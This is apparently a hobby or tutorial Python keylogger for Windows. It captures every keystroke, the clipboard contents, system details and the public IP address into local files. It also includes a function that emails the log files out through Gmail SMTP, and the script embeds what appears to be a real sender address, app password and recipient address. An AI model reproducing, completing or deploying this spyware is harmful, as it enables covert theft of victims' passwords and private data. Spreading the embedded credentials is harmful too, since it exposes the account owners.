# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "system_information.txt"
clipboard_information = "clipboard_information.txt"
email_address = "romanrtera@gmail.com"
password = "wjrx pxld iyqu lvec"
to_addr = "boglarka_m@yahoo.com"

file_path = "D:\\keylog\\Keylogger\\Project"
extend = "\\"
count = 0
keys = []


def send_email(filename, attachment, to_addr):
    from_addr = email_address
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Log File'
    body = 'Body_of_the_mail'
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment; filename= %s' % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, to_addr, text)
    s.quit()


# send_email(keys_information, file_path + extend + keys_information, to_addr)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address:" + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + (platform.platform() + '\n'))
        f.write("System: " + platform.system() + " " + platform.release() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ip_addr + '\n')


computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could no be copied")


copy_clipboard()


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# comment
